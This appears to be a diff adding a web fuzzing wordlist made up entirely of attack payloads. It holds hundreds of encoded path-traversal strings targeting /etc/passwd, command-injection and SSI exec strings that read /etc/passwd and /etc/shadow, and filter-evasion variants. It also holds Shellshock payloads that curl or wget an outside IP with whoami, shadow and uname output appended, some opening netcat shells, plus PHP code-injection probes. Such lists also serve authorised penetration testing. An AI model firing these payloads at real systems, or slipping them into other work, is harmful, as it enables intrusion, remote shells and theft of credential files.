+%%32%65%%32%65/%%32%65%%32%65//etc/passwd
+%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65//etc/passwd
+%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65//etc/passwd
+%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65//etc/passwd
+%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65//etc/passwd
+%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65//etc/passwd
+%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65//etc/passwd
+%%32%65%%32%65%%32%66/etc/passwd
+%%32%65%%32%65%%32%66%%32%65%%32%65%%32%66/etc/passwd
+%%32%65%%32%65%%32%66%%32%65%%32%65%%32%66%%32%65%%32%65%%32%66/etc/passwd
+%%32%65%%32%65%%32%66%%32%65%%32%65%%32%66%%32%65%%32%65%%32%66%%32%65%%32%65%%32%66/etc/passwd
+%%32%65%%32%65%%32%66%%32%65%%32%65%%32%66%%32%65%%32%65%%32%66%%32%65%%32%65%%32%66%%32%65%%32%65%%32%66/etc/passwd
+%%32%65%%32%65%%32%66%%32%65%%32%65%%32%66%%32%65%%32%65%%32%66%%32%65%%32%65%%32%66%%32%65%%32%65%%32%66%%32%65%%32%65%%32%66/etc/passwd
+%%32%65%%32%65%%32%66%%32%65%%32%65%%32%66%%32%65%%32%65%%32%66%%32%65%%32%65%%32%66%%32%65%%32%65%%32%66%%32%65%%32%65%%32%66%%32%65%%32%65%%32%66/etc/passwd
+%%32%65%%32%65%%32%66%%32%65%%32%65%%32%66%%32%65%%32%65%%32%66%%32%65%%32%65%%32%66%%32%65%%32%65%%32%66%%32%65%%32%65%%32%66%%32%65%%32%65%%32%66%%32%65%%32%65%%32%66/etc/passwd
+..%%35%63/etc/passwd
+..%%35%63..%%35%63/etc/passwd
+..%%35%63..%%35%63..%%35%63/etc/passwd
+..%%35%63..%%35%63..%%35%63..%%35%63/etc/passwd
+..%%35%63..%%35%63..%%35%63..%%35%63..%%35%63/etc/passwd
+..%%35%63..%%35%63..%%35%63..%%35%63..%%35%63..%%35%63/etc/passwd
+..%%35%63..%%35%63..%%35%63..%%35%63..%%35%63..%%35%63..%%35%63/etc/passwd
+..%%35%63..%%35%63..%%35%63..%%35%63..%%35%63..%%35%63..%%35%63..%%35%63/etc/passwd
+%%32%65%%32%65//etc/passwd
+%%32%65%%32%65/%%32%65%%32%65//etc/passwd
+%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65//etc/passwd
+%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65//etc/passwd
+%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65//etc/passwd
+%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65//etc/passwd
+%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65//etc/passwd
+%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65//etc/passwd
+%%32%65%%32%65%%35%63/etc/passwd
+%%32%65%%32%65%%35%63%%32%65%%32%65%%35%63/etc/passwd
+%%32%65%%32%65%%35%63%%32%65%%32%65%%35%63%%32%65%%32%65%%35%63/etc/passwd
+%%32%65%%32%65%%35%63%%32%65%%32%65%%35%63%%32%65%%32%65%%35%63%%32%65%%32%65%%35%63/etc/passwd
+%%32%65%%32%65%%35%63%%32%65%%32%65%%35%63%%32%65%%32%65%%35%63%%32%65%%32%65%%35%63%%32%65%%32%65%%35%63/etc/passwd
+%%32%65%%32%65%%35%63%%32%65%%32%65%%35%63%%32%65%%32%65%%35%63%%32%65%%32%65%%35%63%%32%65%%32%65%%35%63%%32%65%%32%65%%35%63/etc/passwd
+%%32%65%%32%65%%35%63%%32%65%%32%65%%35%63%%32%65%%32%65%%35%63%%32%65%%32%65%%35%63%%32%65%%32%65%%35%63%%32%65%%32%65%%35%63%%32%65%%32%65%%35%63/etc/passwd
+%%32%65%%32%65%%35%63%%32%65%%32%65%%35%63%%32%65%%32%65%%35%63%%32%65%%32%65%%35%63%%32%65%%32%65%%35%63%%32%65%%32%65%%35%63%%32%65%%32%65%%35%63%%32%65%%32%65%%35%63/etc/passwd
+..//etc/passwd%00index.html
+../..//etc/passwd%00index.html
+../../..//etc/passwd%00index.html
+../../../..//etc/passwd%00index.html
+../../../../..//etc/passwd%00index.html
+../../../../../..//etc/passwd%00index.html
+../../../../../../..//etc/passwd%00index.html
+../../../../../../../..//etc/passwd%00index.html
+..%2f/etc/passwd%00index.html
+..%2f..%2f/etc/passwd%00index.html
+..%2f..%2f..%2f/etc/passwd%00index.html
+..%2f..%2f..%2f..%2f/etc/passwd%00index.html
+..%2f..%2f..%2f..%2f..%2f/etc/passwd%00index.html
+..%2f..%2f..%2f..%2f..%2f..%2f/etc/passwd%00index.html
+..%2f..%2f..%2f..%2f..%2f..%2f..%2f/etc/passwd%00index.html
+..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f/etc/passwd%00index.html
+%2e%2e//etc/passwd%00index.html
+%2e%2e/%2e%2e//etc/passwd%00index.html
+%2e%2e/%2e%2e/%2e%2e//etc/passwd%00index.html
+%2e%2e/%2e%2e/%2e%2e/%2e%2e//etc/passwd%00index.html
+%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e//etc/passwd%00index.html
+%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e//etc/passwd%00index.html
+%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e//etc/passwd%00index.html
+%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e//etc/passwd%00index.html
+%2e%2e%2f/etc/passwd%00index.html
+%2e%2e%2f%2e%2e%2f/etc/passwd%00index.html
+%2e%2e%2f%2e%2e%2f%2e%2e%2f/etc/passwd%00index.html
+%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f/etc/passwd%00index.html
+%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f/etc/passwd%00index.html
+%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f/etc/passwd%00index.html
+%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f/etc/passwd%00index.html
+%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f/etc/passwd%00index.html
+..%252f/etc/passwd%00index.html
+..%252f..%252f/etc/passwd%00index.html
+..%252f..%252f..%252f/etc/passwd%00index.html
+..%252f..%252f..%252f..%252f/etc/passwd%00index.html
+..%252f..%252f..%252f..%252f..%252f/etc/passwd%00index.html
+..%252f..%252f..%252f..%252f..%252f..%252f/etc/passwd%00index.html
+..%252f..%252f..%252f..%252f..%252f..%252f..%252f/etc/passwd%00index.html
+..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f/etc/passwd%00index.html
+%252e%252e//etc/passwd%00index.html
+%252e%252e/%252e%252e//etc/passwd%00index.html
+%252e%252e/%252e%252e/%252e%252e//etc/passwd%00index.html
+%252e%252e/%252e%252e/%252e%252e/%252e%252e//etc/passwd%00index.html
+%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e//etc/passwd%00index.html
+%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e//etc/passwd%00index.html
+%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e//etc/passwd%00index.html
+%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e//etc/passwd%00index.html
+%252e%252e%252f/etc/passwd%00index.html
+%252e%252e%252f%252e%252e%252f/etc/passwd%00index.html
+%252e%252e%252f%252e%252e%252f%252e%252e%252f/etc/passwd%00index.html
+%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f/etc/passwd%00index.html
+%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f/etc/passwd%00index.html
+%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f/etc/passwd%00index.html
+%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f/etc/passwd%00index.html
+%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f/etc/passwd%00index.html
+..\/etc/passwd%00index.html
+..\..\/etc/passwd%00index.html
+..\..\..\/etc/passwd%00index.html
+..\..\..\..\/etc/passwd%00index.html
+..\..\..\..\..\/etc/passwd%00index.html
+..\..\..\..\..\..\/etc/passwd%00index.html
+..\..\..\..\..\..\..\/etc/passwd%00index.html
+..\..\..\..\..\..\..\..\/etc/passwd%00index.html
+..%5c/etc/passwd%00index.html
+..%5c..%5c/etc/passwd%00index.html
+..%5c..%5c..%5c/etc/passwd%00index.html
+..%5c..%5c..%5c..%5c/etc/passwd%00index.html
+..%5c..%5c..%5c..%5c..%5c/etc/passwd%00index.html
+..%5c..%5c..%5c..%5c..%5c..%5c/etc/passwd%00index.html
+..%5c..%5c..%5c..%5c..%5c..%5c..%5c/etc/passwd%00index.html
+..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c/etc/passwd%00index.html
+%2e%2e\/etc/passwd%00index.html
+%2e%2e\%2e%2e\/etc/passwd%00index.html
+%2e%2e\%2e%2e\%2e%2e\/etc/passwd%00index.html
+%2e%2e\%2e%2e\%2e%2e\%2e%2e\/etc/passwd%00index.html
+%2e%2e\%2e%2e\%2e%2e\%2e%2e\%2e%2e\/etc/passwd%00index.html
+%2e%2e\%2e%2e\%2e%2e\%2e%2e\%2e%2e\%2e%2e\/etc/passwd%00index.html
+%2e%2e\%2e%2e\%2e%2e\%2e%2e\%2e%2e\%2e%2e\%2e%2e\/etc/passwd%00index.html
+%2e%2e\%2e%2e\%2e%2e\%2e%2e\%2e%2e\%2e%2e\%2e%2e\%2e%2e\/etc/passwd%00index.html
+%2e%2e%5c/etc/passwd%00index.html
+%2e%2e%5c%2e%2e%5c/etc/passwd%00index.html
+%2e%2e%5c%2e%2e%5c%2e%2e%5c/etc/passwd%00index.html
+%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c/etc/passwd%00index.html
+%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c/etc/passwd%00index.html
+%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c/etc/passwd%00index.html
+%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c/etc/passwd%00index.html
+%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c/etc/passwd%00index.html
+..%255c/etc/passwd%00index.html
+..%255c..%255c/etc/passwd%00index.html
+..%255c..%255c..%255c/etc/passwd%00index.html
+..%255c..%255c..%255c..%255c/etc/passwd%00index.html
+..%255c..%255c..%255c..%255c..%255c/etc/passwd%00index.html
+..%255c..%255c..%255c..%255c..%255c..%255c/etc/passwd%00index.html
+..%255c..%255c..%255c..%255c..%255c..%255c..%255c/etc/passwd%00index.html
+..%255c..%255c..%255c..%255c..%255c..%255c..%255c..%255c/etc/passwd%00index.html
+%252e%252e\/etc/passwd%00index.html
+%252e%252e\%252e%252e\/etc/passwd%00index.html
+%252e%252e\%252e%252e\%252e%252e\/etc/passwd%00index.html
+%252e%252e\%252e%252e\%252e%252e\%252e%252e\/etc/passwd%00index.html
+%252e%252e\%252e%252e\%252e%252e\%252e%252e\%252e%252e\/etc/passwd%00index.html
+%252e%252e\%252e%252e\%252e%252e\%252e%252e\%252e%252e\%252e%252e\/etc/passwd%00index.html
+%252e%252e\%252e%252e\%252e%252e\%252e%252e\%252e%252e\%252e%252e\%252e%252e\/etc/passwd%00index.html
+%252e%252e\%252e%252e\%252e%252e\%252e%252e\%252e%252e\%252e%252e\%252e%252e\%252e%252e\/etc/passwd%00index.html
+%252e%252e%255c/etc/passwd%00index.html
+%252e%252e%255c%252e%252e%255c/etc/passwd%00index.html
+%252e%252e%255c%252e%252e%255c%252e%252e%255c/etc/passwd%00index.html
+%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c/etc/passwd%00index.html
+%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c/etc/passwd%00index.html
+%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c/etc/passwd%00index.html
+%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c/etc/passwd%00index.html
+%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c/etc/passwd%00index.html
+..//etc/passwd;index.html
+../..//etc/passwd;index.html
+../../..//etc/passwd;index.html
+../../../..//etc/passwd;index.html
+../../../../..//etc/passwd;index.html
+../../../../../..//etc/passwd;index.html
+../../../../../../..//etc/passwd;index.html
+../../../../../../../..//etc/passwd;index.html
+..%2f/etc/passwd;index.html
+..%2f..%2f/etc/passwd;index.html
+..%2f..%2f..%2f/etc/passwd;index.html
+..%2f..%2f..%2f..%2f/etc/passwd;index.html
+..%2f..%2f..%2f..%2f..%2f/etc/passwd;index.html
+..%2f..%2f..%2f..%2f..%2f..%2f/etc/passwd;index.html
+..%2f..%2f..%2f..%2f..%2f..%2f..%2f/etc/passwd;index.html
+..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f/etc/passwd;index.html
+%2e%2e//etc/passwd;index.html
+%2e%2e/%2e%2e//etc/passwd;index.html
+%2e%2e/%2e%2e/%2e%2e//etc/passwd;index.html
+%2e%2e/%2e%2e/%2e%2e/%2e%2e//etc/passwd;index.html
+%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e//etc/passwd;index.html
+%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e//etc/passwd;index.html
+%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e//etc/passwd;index.html
+%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e//etc/passwd;index.html
+%2e%2e%2f/etc/passwd;index.html
+%2e%2e%2f%2e%2e%2f/etc/passwd;index.html
+%2e%2e%2f%2e%2e%2f%2e%2e%2f/etc/passwd;index.html
+%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f/etc/passwd;index.html
+%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f/etc/passwd;index.html
+%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f/etc/passwd;index.html
+%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f/etc/passwd;index.html
+%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f/etc/passwd;index.html
+..%252f/etc/passwd;index.html
+..%252f..%252f/etc/passwd;index.html
+..%252f..%252f..%252f/etc/passwd;index.html
+..%252f..%252f..%252f..%252f/etc/passwd;index.html
+..%252f..%252f..%252f..%252f..%252f/etc/passwd;index.html
+..%252f..%252f..%252f..%252f..%252f..%252f/etc/passwd;index.html
+..%252f..%252f..%252f..%252f..%252f..%252f..%252f/etc/passwd;index.html
+..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f/etc/passwd;index.html
+%252e%252e//etc/passwd;index.html
+%252e%252e/%252e%252e//etc/passwd;index.html
+%252e%252e/%252e%252e/%252e%252e//etc/passwd;index.html
+%252e%252e/%252e%252e/%252e%252e/%252e%252e//etc/passwd;index.html
+%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e//etc/passwd;index.html
+%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e//etc/passwd;index.html
+%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e//etc/passwd;index.html
+%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e//etc/passwd;index.html
+%252e%252e%252f/etc/passwd;index.html
+%252e%252e%252f%252e%252e%252f/etc/passwd;index.html
+%252e%252e%252f%252e%252e%252f%252e%252e%252f/etc/passwd;index.html
+%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f/etc/passwd;index.html
+%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f/etc/passwd;index.html
+%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f/etc/passwd;index.html
+%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f/etc/passwd;index.html
+%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f/etc/passwd;index.html
+..\/etc/passwd;index.html
+..\..\/etc/passwd;index.html
+..\..\..\/etc/passwd;index.html
+..\..\..\..\/etc/passwd;index.html
+..\..\..\..\..\/etc/passwd;index.html
+..\..\..\..\..\..\/etc/passwd;index.html
+..\..\..\..\..\..\..\/etc/passwd;index.html
+..\..\..\..\..\..\..\..\/etc/passwd;index.html
+..%5c/etc/passwd;index.html
+..%5c..%5c/etc/passwd;index.html
+..%5c..%5c..%5c/etc/passwd;index.html
+..%5c..%5c..%5c..%5c/etc/passwd;index.html
+..%5c..%5c..%5c..%5c..%5c/etc/passwd;index.html
+..%5c..%5c..%5c..%5c..%5c..%5c/etc/passwd;index.html
+..%5c..%5c..%5c..%5c..%5c..%5c..%5c/etc/passwd;index.html
+..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c/etc/passwd;index.html
+%2e%2e\/etc/passwd;index.html
+%2e%2e\%2e%2e\/etc/passwd;index.html
+%2e%2e\%2e%2e\%2e%2e\/etc/passwd;index.html
+%2e%2e\%2e%2e\%2e%2e\%2e%2e\/etc/passwd;index.html
+%2e%2e\%2e%2e\%2e%2e\%2e%2e\%2e%2e\/etc/passwd;index.html
+%2e%2e\%2e%2e\%2e%2e\%2e%2e\%2e%2e\%2e%2e\/etc/passwd;index.html
+%2e%2e\%2e%2e\%2e%2e\%2e%2e\%2e%2e\%2e%2e\%2e%2e\/etc/passwd;index.html
+%2e%2e\%2e%2e\%2e%2e\%2e%2e\%2e%2e\%2e%2e\%2e%2e\%2e%2e\/etc/passwd;index.html
+%2e%2e%5c/etc/passwd;index.html
+%2e%2e%5c%2e%2e%5c/etc/passwd;index.html
+%2e%2e%5c%2e%2e%5c%2e%2e%5c/etc/passwd;index.html
+%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c/etc/passwd;index.html
+%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c/etc/passwd;index.html
+%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c/etc/passwd;index.html
+%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c/etc/passwd;index.html
+%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c/etc/passwd;index.html
+..%255c/etc/passwd;index.html
+..%255c..%255c/etc/passwd;index.html
+..%255c..%255c..%255c/etc/passwd;index.html
+..%255c..%255c..%255c..%255c/etc/passwd;index.html
+..%255c..%255c..%255c..%255c..%255c/etc/passwd;index.html
+..%255c..%255c..%255c..%255c..%255c..%255c/etc/passwd;index.html
+..%255c..%255c..%255c..%255c..%255c..%255c..%255c/etc/passwd;index.html
+..%255c..%255c..%255c..%255c..%255c..%255c..%255c..%255c/etc/passwd;index.html
+%252e%252e\/etc/passwd;index.html
+%252e%252e\%252e%252e\/etc/passwd;index.html
+%252e%252e\%252e%252e\%252e%252e\/etc/passwd;index.html
+%252e%252e\%252e%252e\%252e%252e\%252e%252e\/etc/passwd;index.html
+%252e%252e\%252e%252e\%252e%252e\%252e%252e\%252e%252e\/etc/passwd;index.html
+%252e%252e\%252e%252e\%252e%252e\%252e%252e\%252e%252e\%252e%252e\/etc/passwd;index.html
+%252e%252e\%252e%252e\%252e%252e\%252e%252e\%252e%252e\%252e%252e\%252e%252e\/etc/passwd;index.html
+%252e%252e\%252e%252e\%252e%252e\%252e%252e\%252e%252e\%252e%252e\%252e%252e\%252e%252e\/etc/passwd;index.html
+%252e%252e%255c/etc/passwd;index.html
+%252e%252e%255c%252e%252e%255c/etc/passwd;index.html
+%252e%252e%255c%252e%252e%255c%252e%252e%255c/etc/passwd;index.html
+%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c/etc/passwd;index.html
+%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c/etc/passwd;index.html
+%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c/etc/passwd;index.html
+%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c/etc/passwd;index.html
+%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c/etc/passwd;index.html
+\..//etc/passwd
+\../\..//etc/passwd
+\../\../\..//etc/passwd
+\../\../\../\..//etc/passwd
+\../\../\../\../\..//etc/passwd
+\../\../\../\../\../\..//etc/passwd
+\../\../\../\../\../\../\..//etc/passwd
+\../\../\../\../\../\../\../\..//etc/passwd
+/..\/etc/passwd
+/..\/..\/etc/passwd
+/..\/..\/..\/etc/passwd
+/..\/..\/..\/..\/etc/passwd
+/..\/..\/..\/..\/..\/etc/passwd
+/..\/..\/..\/..\/..\/..\/etc/passwd
+/..\/..\/..\/..\/..\/..\/..\/etc/passwd
+/..\/..\/..\/..\/..\/..\/..\/..\/etc/passwd
+
+&lt;!--#exec%20cmd=&quot;/bin/cat%20/etc/passwd&quot;--&gt;
+&lt;!--#exec%20cmd=&quot;/bin/cat%20/etc/shadow&quot;--&gt;
+&lt;!--#exec%20cmd=&quot;/usr/bin/id;--&gt;
+&lt;!--#exec%20cmd=&quot;/usr/bin/id;--&gt;
+/index.html|id|
+;id;
+;id
+;netstat -a;
+;system('cat%20/etc/passwd')
+;id;
+|id
+|/usr/bin/id
+|id|
+|/usr/bin/id|
+||/usr/bin/id|
+|id;
+||/usr/bin/id;
+;id|
+!id!
+%id%
+||id||
+!id
+%id
+;|/usr/bin/id|
+\n/bin/ls -al\n
+\n/usr/bin/id\n
+\nid\n
+\n/usr/bin/id;
+\nid;
+\n/usr/bin/id|
+\nid|
+;/usr/bin/id\n
+;id\n
+|usr/bin/id\n
+|nid\n
+`id`
+`/usr/bin/id`
+a);id
+a;id
+a);id;
+a;id;
+a);id|
+a;id|
+a)|id
+a|id
+a)|id;
+a|id
+|/bin/ls -al
+a);/usr/bin/id
+a;/usr/bin/id
+a);/usr/bin/id;
+a;/usr/bin/id;
+a);/usr/bin/id|
+a;/usr/bin/id|
+a)|/usr/bin/id
+a|/usr/bin/id
+a)|/usr/bin/id;
+a|/usr/bin/id
+;system('cat%20/etc/passwd')
+;system('id')
+;system('/usr/bin/id')
+%0Acat%20/etc/passwd
+%0A/usr/bin/id
+%0Aid
+%0A/usr/bin/id%0A
+%0Aid%0A
+& ping -i 30 127.0.0.1 &
+& ping -n 30 127.0.0.1 &
+%0a ping -i 30 127.0.0.1 %0a
+`ping 127.0.0.1`
+-c 10 127.0.0.1
+-c 10 google.com
+x||ping+-c+10+127.0.0.1||
+||ping+-c+10+127.0.0.1||
+||id>/var/www/html/id.txt||
+||nslookup+www.nsa.gov||
+x&&ping+-c+10+127.0.0.1||
+&&ping+-c+10+127.0.0.1&&
+|id
+&id
+;id
+||id
+&&id
+%0aid%0a
+`id`
+||nslookup+`whoami`.localhost.com||
+$;/usr/bin/id
+cat ${HOME:0:1}etc${HOME:0:1}passwd
+cat $(echo . | tr '!-0' '"-1')etc$(echo . | tr '!-0' '"-1')passwd
+cat $(echo -e "\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64")
+cat $(xxd -r -p <<< 2f6574632f706173737764)
+cat $(xxd -r -ps <(echo 2f6574632f706173737764))
+c'a't /etc/passwd
+c"a"t /etc/passwd
+c\a\t /etc/passwd
+ca$@t /etc/passwd
+/???/c?t /etc/passwd
+/???/c?t /?tc/?as?wd
+() { :;}; /bin/bash -c "curl http://135.23.158.130/.testing/shellshock.txt?vuln=16?user=\`whoami\`"
+() { :;}; /bin/bash -c "curl http://135.23.158.130/.testing/shellshock.txt?vuln=18?pwd=\`pwd\`"
+() { :;}; /bin/bash -c "curl http://135.23.158.130/.testing/shellshock.txt?vuln=20?shadow=\`grep root /etc/shadow\`"
+() { :;}; /bin/bash -c "curl http://135.23.158.130/.testing/shellshock.txt?vuln=22?uname=\`uname -a\`"
+() { :;}; /bin/bash -c "curl http://135.23.158.130/.testing/shellshock.txt?vuln=24?shell=\`nc -lvvp 1234 -e /bin/bash\`"
+() { :;}; /bin/bash -c "curl http://135.23.158.130/.testing/shellshock.txt?vuln=26?shell=\`nc -lvvp 1236 -e /bin/bash &\`"
+() { :;}; /bin/bash -c "curl http://135.23.158.130/.testing/shellshock.txt?vuln=5"
+() { :;}; /bin/bash -c "sleep 1 && curl http://135.23.158.130/.testing/shellshock.txt?sleep=1&?vuln=6"
+() { :;}; /bin/bash -c "sleep 1 && echo vulnerable 1"
+() { :;}; /bin/bash -c "sleep 3 && curl http://135.23.158.130/.testing/shellshock.txt?sleep=3&?vuln=7"
+() { :;}; /bin/bash -c "sleep 3 && echo vulnerable 3"
+() { :;}; /bin/bash -c "sleep 6 && curl http://135.23.158.130/.testing/shellshock.txt?sleep=6&?vuln=8"
+() { :;}; /bin/bash -c "sleep 6 && curl http://135.23.158.130/.testing/shellshock.txt?sleep=9&?vuln=9"
+() { :;}; /bin/bash -c "sleep 6 && echo vulnerable 6"
+() { :;}; /bin/bash -c "wget http://135.23.158.130/.testing/shellshock.txt?vuln=17?user=\`whoami\`"
+() { :;}; /bin/bash -c "wget http://135.23.158.130/.testing/shellshock.txt?vuln=19?pwd=\`pwd\`"
+() { :;}; /bin/bash -c "wget http://135.23.158.130/.testing/shellshock.txt?vuln=21?shadow=\`grep root /etc/shadow\`"
+() { :;}; /bin/bash -c "wget http://135.23.158.130/.testing/shellshock.txt?vuln=23?uname=\`uname -a\`"
+() { :;}; /bin/bash -c "wget http://135.23.158.130/.testing/shellshock.txt?vuln=25?shell=\`nc -lvvp 1235 -e /bin/bash\`"
+() { :;}; /bin/bash -c "wget http://135.23.158.130/.testing/shellshock.txt?vuln=27?shell=\`nc -lvvp 1237 -e /bin/bash &\`"
+() { :;}; /bin/bash -c "wget http://135.23.158.130/.testing/shellshock.txt?vuln=4"
+cat /etc/hosts
+$(`cat /etc/passwd`)
+cat /etc/passwd
+%0Acat%20/etc/passwd
+{{ get_user_file("/etc/passwd") }}
+<!--#exec cmd="/bin/cat /etc/passwd"-->
+<!--#exec cmd="/bin/cat /etc/shadow"-->
+<!--#exec cmd="/usr/bin/id;-->
+system('cat /etc/passwd');
+`
+|| 
+| 
+; 
+'
+'"
+"
+"'
+& 
+&& 
+%0a
+%0a%0d
+
+%0Aid
+%0a id %0a
+%0Aid%0A
+!whoami!
+%whoami%
+!%whoami
+%!whoami
+%!whoami!%
+!%whoami%!
+%0a ping -i 30 127.0.0.1 %0a
+%0A/usr/bin/id
+%0A/usr/bin/id%0A
+%2 -n 21 127.0.0.1||`ping -c 21 127.0.0.1` #' |ping -n 21 127.0.0.1||`ping -c 21 127.0.0.1` #\" |ping -n 21 127.0.0.1
+%20{${phpinfo()}}
+%20{${sleep(20)}}
+%20{${sleep(3)}}
+a|id|
+a;id|
+a;id;
+a;id\n
+() { :;}; curl http://135.23.158.130/.testing/shellshock.txt?vuln=12
+| curl http://crowdshield.com/.testing/rce.txt
+& curl http://crowdshield.com/.testing/rce.txt
+; curl https://crowdshield.com/.testing/rce_vuln.txt
+&& curl https://crowdshield.com/.testing/rce_vuln.txt
+curl https://crowdshield.com/.testing/rce_vuln.txt
